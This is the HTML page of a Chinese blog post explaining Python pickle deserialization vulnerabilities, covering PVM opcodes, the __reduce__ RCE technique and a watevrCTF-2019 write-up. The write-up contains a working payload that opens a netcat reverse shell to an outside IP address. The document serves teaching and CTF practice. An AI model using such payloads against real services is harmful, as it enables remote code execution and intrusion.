@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"tianliuyun.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Pickle库及函数pickle是python语言的一个标准模块，实现了基本的数据序列化和反序列化。pickle模块是以二进制的形式序列化后保存到文件中（保存文件的后缀为.pkl），不能直接打开进行预览。    函数 说明    dumps 对象反序列化为bytes对象   dump 对象反序列化到文件对象，存入文件   loads 从bytes对象反序列化   load 对象反序列化，从文件中读">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pickle 反序列化漏洞浅析">
+<meta property="og:url" content="https://tianliuyun.github.io/2021/08/07/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/index.html">
+<meta property="og:site_name" content="花与剑">
+<meta property="og:description" content="Pickle库及函数pickle是python语言的一个标准模块，实现了基本的数据序列化和反序列化。pickle模块是以二进制的形式序列化后保存到文件中（保存文件的后缀为.pkl），不能直接打开进行预览。    函数 说明    dumps 对象反序列化为bytes对象   dump 对象反序列化到文件对象，存入文件   loads 从bytes对象反序列化   load 对象反序列化，从文件中读">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-08-07T07:14:00.000Z">
+<meta property="article:modified_time" content="2021-08-07T07:24:38.232Z">
+<meta property="article:author" content="Derait">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://tianliuyun.github.io/2021/08/07/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pickle 反序列化漏洞浅析 | 花与剑</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">花与剑</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://tianliuyun.github.io/2021/08/07/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Derait">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="花与剑">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pickle 反序列化漏洞浅析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-07 15:14:00 / 修改时间：15:24:38" itemprop="dateCreated datePublished" datetime="2021-08-07T15:14:00+08:00">2021-08-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Pickle库及函数"><a href="#Pickle库及函数" class="headerlink" title="Pickle库及函数"></a>Pickle库及函数</h2><p>pickle是python语言的一个标准模块，实现了基本的数据序列化和反序列化。<br>pickle模块是以二进制的形式序列化后保存到文件中（保存文件的后缀为<code>.pkl</code>），不能直接打开进行预览。</p>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">dumps</td>
+<td align="center">对象反序列化为bytes对象</td>
+</tr>
+<tr>
+<td align="center">dump</td>
+<td align="center">对象反序列化到文件对象，存入文件</td>
+</tr>
+<tr>
+<td align="center">loads</td>
+<td align="center">从bytes对象反序列化</td>
+</tr>
+<tr>
+<td align="center">load</td>
+<td align="center">对象反序列化，从文件中读取数据</td>
+</tr>
+</tbody></table>
+<p>先通过几个例子来看下这几个函数的作用：</p>
+<p><strong>dump/load</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">#序列化
+pickle.dump(obj, file, protocol&#x3D;None,)
+obj表示要进行封装的对象(必填参数）
+file表示obj要写入的文件对象
+以二进制可写模式打开即wb(必填参数）
+#反序列化
+pickle.load(file, *, fix_imports&#x3D;True, encoding&#x3D;&quot;ASCII&quot;, errors&#x3D;&quot;strict&quot;, buffers&#x3D;None)
+file文件中读取封存后的对象
+以二进制可读模式打开即rb(必填参数)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">import os
+import pickle
+
+class orange(object):
+    def __init__(self,a,b):
+        self.a &#x3D; a
+        self.b &#x3D; b
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+    orange1 &#x3D; orange(&#39;1&#39;,&#39;2&#39;)
+    print orange1
+    print &quot;\n&quot;
+    file1 &#x3D; open(&#39;11.txt&#39;,&#39;wb&#39;)
+    pickle.dump(orange1,file1)
+    file1.close()
+    
+	os.system(&quot;cat 11.txt&quot;)
+    
+    file2 &#x3D; open(&#39;11.txt&#39;,&#39;rb&#39;)
+    data &#x3D; pickle.load(file2)
+    file2.close()
+	print &quot;\n&quot;
+    print data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>dumps/loads</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">#序列化
+pickle.dumps(obj, protocol&#x3D;None,*,fix_imports&#x3D;True)
+dumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。
+#反序列化
+pickle.loads(bytes_object, *,fix_imports&#x3D;True, encoding&#x3D;&quot;ASCII&quot;. errors&#x3D;&quot;strict&quot;)
+loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">import os
+import pickle
+
+class orange(object):
+    def __init__(self,a,b):
+        self.a &#x3D; a
+        self.b &#x3D; b
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+    orange1 &#x3D; orange(&#39;1&#39;,&#39;2&#39;)
+    print orange1
+    print &quot;\n&quot;
+    strings &#x3D; pickle.dumps(orange1)
+    print strings
+    print &quot;\n&quot;
+    data &#x3D; pickle.loads(strings)
+    print(data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>两个python2脚本的执行结果是一样的</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;__main__.orange object at 0x7fae5772cf90&gt;
+
+
+ccopy_reg
+_reconstructor
+p0
+(c__main__
+orange
+p1
+c__builtin__
+object
+p2
+Ntp3
+Rp4
+(dp5
+S&#39;a&#39;
+p6
+S&#39;1&#39;
+p7
+sS&#39;b&#39;
+p8
+S&#39;2&#39;
+p9
+sb.
+
+
+&lt;__main__.orange object at 0x7fae57732050&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在<code>python2</code>中以字符串的形式进行转换时，这些序列化的字符串是什么意思，又按照什么规则生成的，这就涉及到了PVM，因为它是<code>Python</code>序列化过程和反序列化过程中最根本的东西。</p>
+<h2 id="PVM-Python-Virtual-Machine"><a href="#PVM-Python-Virtual-Machine" class="headerlink" title="PVM(Python Virtual Machine)"></a>PVM(Python Virtual Machine)</h2><p>一般来说,我们讨论Python,是将其作为一门编程语言来详解.但是,从实际情况来看,Python也是一个名为解释器的软件包.解释器是可以让程序运行起来一套程序,具有独立性.所以当你写了一段代码之后,Python解释器读取程序,将其转化为命令执行,得出结果.<br>总的来说,解释器就是代码与计算机硬件之间的软件逻辑层.</p>
+<h3 id="PVM的作用"><a href="#PVM的作用" class="headerlink" title="PVM的作用"></a>PVM的作用</h3><p>对于Python而言，它可以直接从源代码运行程序。Python解释器会将源代码编译为字节码，然后将编译后的字节码转发到Python虚拟机中执行。总的来说，PVM的作用便是用来解释字节码的解释引擎。</p>
+<h3 id="PVM的执行流程"><a href="#PVM的执行流程" class="headerlink" title="PVM的执行流程"></a>PVM的执行流程</h3><p>当运行Python程序时，PVM会执行两个步骤。</p>
+<ol>
+<li><p><code>PVM</code>会把源代码编译成字节码</p>
+<blockquote>
+<p>字节码是Python特有的一种表现形式，不是二进制机器码，需要进一步编译才能被机器执行 . 如果 Python 进程在主机上有写入权限 , 那么它会把程序字节码保存为一个以 .pyc 为扩展名的文件 . 如果没有写入权限 , 则 Python 进程会在内存中生成字节码 , 在程序执行结束后被自动丢弃 .</p>
+</blockquote>
+</li>
+<li><p><code>Python</code>进程会把编译好的字节码转发到<code>PVM（Python虚拟机）</code>中，<code>PVM</code>会循环迭代执行字节码指令，直到所有操作被完成。</p>
+</li>
+</ol>
+<h3 id="PVM与Pickle模块的关系"><a href="#PVM与Pickle模块的关系" class="headerlink" title="PVM与Pickle模块的关系"></a>PVM与Pickle模块的关系</h3><blockquote>
+<p>Pickle是一门基于栈的编程语言 , 有不同的编写方式 , 其本质就是一个轻量级的 PVM .</p>
+</blockquote>
+<p>这个轻量级的PVM由三部分组成及其功能如下：</p>
+<ul>
+<li>指令处理器( Instruction processor )</li>
+</ul>
+<blockquote>
+<p>从数据流中读取操作码和参数 , 并对其进行解释处理 . 指令处理器会循环执行这个过程 , 不断改变 <code>stack</code>和 <code>memo</code>区域的值 .直到遇到 <code>.</code>这个结束符号 。这时 , 最终停留在栈顶的的值将会被作为反序列化对象返回 。</p>
+</blockquote>
+<ul>
+<li>栈区( stack )</li>
+</ul>
+<blockquote>
+<p>由 <code>Python</code>的列表( <code>list</code>)实现 , 作为流数据处理过程中的暂存区 , 在不断的进出栈过程中完成对数据流的反序列化操作，并最终在栈顶生成反序列化的结果</p>
+</blockquote>
+<ul>
+<li>标签区( memo )</li>
+</ul>
+<blockquote>
+<p>由 <code>Python</code>的字典( <code>dict</code>)实现 , 可以看作是数据索引或者标记 , 为 PVM 的整个生命周期提供存储功能 .简单来说就是将反序列化完成的数据以 <code>key-value</code>的形式储存在memo中，以便使用。</p>
+</blockquote>
+<p>需要重点关注一下指令处理器可读的操作码，列出几个比较重要的：</p>
+<ol>
+<li><code>c</code>: 读取本行的内容作为模块名<code>module</code>, 读取下一行的内容作为对象名<code>object</code>，然后将 <code>module.object</code>作为可调用对象压入到栈中</li>
+<li><code>(</code>: 将一个标记对象压入到栈中 , 用于确定命令执行的位置 . 该标记常常搭配 t 指令一起使用 , 以便产生一个元组</li>
+<li><code>S</code>: 后面跟字符串 , PVM会读取引号中的内容 , 直到遇见换行符 , 然后将读取到的内容压入到栈中</li>
+<li><code>t</code>: 从栈中不断弹出数据 , 弹射顺序与压栈时相同 , 直到弹出左括号 . 此时弹出的内容形成了一个元组 , 然后 , 该元组会被压入栈中</li>
+<li><code>R</code>: 将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用对象的参数并执行该对象 。最后将结果压入到栈中</li>
+<li><code>.</code>: 结束整个 <code>Pickle</code>反序列化过程</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">ccopy_reg 			#引入copy_reg模块
+_reconstructor 		#引入_reconstructor对象
+p0 					#p:将栈顶数据(copy_reg._reconstructor)存储在memo中，0是编号
+(c__main__ 			#引入__main__模块
+orange				#引入orange对象
+p1					#将栈顶数据(__main__.orange)存储在memo中，1是编号
+c__builtin__		#引入__builtin__模块
+object				#引入object对象
+p2					#将栈顶数据(__builtin__.object)存储在memo中，2是编号
+Ntp3				#依次从栈中弹出数据直到(，此时弹出的数据组成一个元组，最后将该元组入栈
+Rp4					#将元组和可调用对象全部弹出并执行，将结果压入栈顶，然后将栈顶数据存储在memo中
+					#这里便完成了所有需要的模块和类对象的调用
+(dp5				#在栈顶创建一个字典，将memo中的内容转换成键值对并存储在这个字典中
+					#然后栈顶(这个字典)存储在memo中，5是编号
+S&#39;a&#39;				#创建字符串&#39;a&#39;
+p6					#存储在memo中
+S&#39;1&#39;				#创建字符串’1‘
+p7					#存储在memo中
+sS&#39;b&#39;				#s:将&#39;a&#39;:&#39;1&#39;作为键值对添加到字典中，创建字符串&#39;b&#39;
+p8					#存储在memo中
+S&#39;2&#39;				#创建字符串&#39;2&#39;
+p9					#存储在memo中
+sb.					#将&#39;b&#39;:&#39;2&#39;作为键值对添加到字典中,b:调用setstate或者dic.update()更新字典内容
+					#读取到.结束pickle序列化过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>整个序列化的过程可以分为三个步骤</p>
+<ol>
+<li>从对象中提权所有属性</li>
+<li>写入对象的所有模块名和类名</li>
+<li>写入对象所有属性的键值对</li>
+</ol>
+<p>反序列化的过程就是序列化过程的逆过程。</p>
+<h2 id="Pickle-CPickle反序列化漏洞分析"><a href="#Pickle-CPickle反序列化漏洞分析" class="headerlink" title="Pickle/CPickle反序列化漏洞分析"></a>Pickle/CPickle反序列化漏洞分析</h2><p>反序列化漏洞出现在 <code>__reduce__()</code>魔法函数上，这一点和PHP中的<code>__wakeup()</code>魔术方法类似，都是因为每当反序列化过程开始或者结束时 , 都会自动调用这类函数。而这恰好是反序列化漏洞经常出现的地方。</p>
+<p>而且在反序列化过程中，因为编程语言需要根据反序列化字符串去解析出自己独特的语言数据结构，所以就必须要在内部把解析出来的结构去执行一下。如果在反序列化过程中出现问题，便可能直接造成RCE漏洞.</p>
+<p>另外<code>pickle.loads</code>会解决<code>import</code>问题，对于未引入的<code>module</code>会自动尝试<code>import</code>。那么也就是说整个python标准库的代码执行、命令执行函数都可以进行使用。</p>
+<p>最后还是来看一下这个魔法函数</p>
+<pre class="line-numbers language-none"><code class="language-none">当 __reduce__()函数返回一个元组时 , 第一个元素是一个可调用对象 , 这个对象会在创建对象时被调用 . 第二个元素是可调用对象的参数 , 同样是一个元组。这点跟我们上面提到的PVM中的R操作码功能相似，可以对比下：
+
+R:将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用对象的参数并执行该对象 。最后将结果压入到栈中 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>事实上 , <code>R</code>操作码就是 <code>__reduce__()</code>魔术函数的底层实现 . 而在反序列化过程结束的时候 , Python 进程会自动调用 <code>__reduce__()</code>魔术方法 . 如果可以控制被调用函数的参数 , Python 进程就可以执行恶意代码 .</p>
+<p><strong>注意：</strong></p>
+<blockquote>
+<p>在python2中只有内置类才有<code>__reduce__</code>方法，即用<code>class A(object)</code>声明的类，而<code>python3</code>中已经默认都是内置类了</p>
+</blockquote>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>漏洞可能出现的位置：</strong></p>
+<ol>
+<li>解析认证token、session的时候</li>
+<li>将对象Pickle后存储成磁盘文件</li>
+<li>将对象Pickle后在网络中传输</li>
+<li>参数传递给程序</li>
+</ol>
+<p><strong>命令执行</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">import pickle
+import os
+
+class Test2(object):
+    def __reduce__(self):
+    	#被调用函数的参数
+        cmd &#x3D; &quot;&#x2F;usr&#x2F;bin&#x2F;id&quot; 
+        return (os.system,(cmd,))
+
+if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
+    test &#x3D; Test2()
+    #执行序列化操作
+    result1 &#x3D; pickle.dumps(test)
+    #执行反序列化操作
+    result2 &#x3D; pickle.loads(result1)
+
+# __reduce__()魔法方法的返回值:
+# return(os.system,(cmd,))
+# 1.满足返回一个元组，元组中有两个参数
+# 2.第一个参数是被调用函数 : os.system()
+# 3.第二个参数是一个元组:(cmd,),元组中被调用的参数 cmd
+# 4. 因此序列化时被解析执行的代码是 os.system(&quot;&#x2F;usr&#x2F;bin&#x2F;id&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="例题-watevrCTF-2019-Pickle-Store"><a href="#例题-watevrCTF-2019-Pickle-Store" class="headerlink" title="例题 [watevrCTF-2019]Pickle Store"></a>例题 [watevrCTF-2019]Pickle Store</h2><p>打开环境，我们购买不同东西时session是在变化的</p>
+<p>将session进行base64解码</p>
+<pre class="line-numbers language-none"><code class="language-none">&#125;q(XmoneyqMXhistoryq]qXanti_tamper_hmacqX aa1ba4de55048cf20e0a7a63b7f8eb62qu.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>有很明显的关键字，结合题目pickle store，应该是考察pickle反序列化漏洞</p>
+<pre class="line-numbers language-none"><code class="language-none">import pickleimport base64session &#x3D; &quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;print(pickle.loads(base64.b64decode(session)))   #&#123;&#39;money&#39;: 500, &#39;history&#39;: [], &#39;anti_tamper_hmac&#39;: &#39;aa1ba4de55048cf20e0a7a63b7f8eb62&#39;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>借助前面所学的知识，我们可以编写反弹shell</p>
+<pre class="line-numbers language-none"><code class="language-none">import base64import pickleimport osclass A(object):    def __reduce__(self):        cmd &#x3D; &quot;nc 39.108.113.70 2333 -e&#x2F;bin&#x2F;sh&quot;        return (os.system, (cmd,))a &#x3D; A()print(base64.b64encode(pickle.dumps(a)))#gASVOgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB9uYyAzOS4xMDguMTEzLjcwIDIzMzMgLWUvYmluL3NolIWUUpQu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>将结果发包，成功回弹了shell，<code>cat flag.txt</code>即可</p>
+<h2 id="python3兼容问题"><a href="#python3兼容问题" class="headerlink" title="python3兼容问题"></a>python3兼容问题</h2><ul>
+<li>序列化</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">import pickleinfo &#x3D; pickle.dumps(data, protocol&#x3D;2)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>反序列化</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">import pickledata &#x3D; pickle.loads(info, encoding&#x3D;&quot;utf-8&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<blockquote>
+<p>参考链接</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252189.html">https://www.freebuf.com/articles/web/252189.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/y472360651/article/details/87209589">https://blog.csdn.net/y472360651/article/details/87209589</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/python/" rel="tag"># python</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/08/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Misc-ext3/" rel="prev" title="攻防世界 Misc ext3">
+      <i class="fa fa-chevron-left"></i> 攻防世界 Misc ext3
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/08/11/Untitled/" rel="next" title="Kali Linux学习笔记(2)——Kali安装">
+      Kali Linux学习笔记(2)——Kali安装 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pickle%E5%BA%93%E5%8F%8A%E5%87%BD%E6%95%B0"><span class="nav-number">1.</span> <span class="nav-text">Pickle库及函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PVM-Python-Virtual-Machine"><span class="nav-number">2.</span> <span class="nav-text">PVM(Python Virtual Machine)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PVM%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="nav-number">2.1.</span> <span class="nav-text">PVM的作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PVM%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="nav-number">2.2.</span> <span class="nav-text">PVM的执行流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PVM%E4%B8%8EPickle%E6%A8%A1%E5%9D%97%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="nav-number">2.3.</span> <span class="nav-text">PVM与Pickle模块的关系</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pickle-CPickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">Pickle&#x2F;CPickle反序列化漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-watevrCTF-2019-Pickle-Store"><span class="nav-number">4.</span> <span class="nav-text">例题 [watevrCTF-2019]Pickle Store</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python3%E5%85%BC%E5%AE%B9%E9%97%AE%E9%A2%98"><span class="nav-number">5.</span> <span class="nav-text">python3兼容问题</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Derait</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="link fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://xcy1010.cn/" title="http:&#x2F;&#x2F;xcy1010.cn&#x2F;" rel="noopener" target="_blank">xcy1010</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://poilzero.sipc115.club/" title="http:&#x2F;&#x2F;poilzero.sipc115.club&#x2F;" rel="noopener" target="_blank">poilzero</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
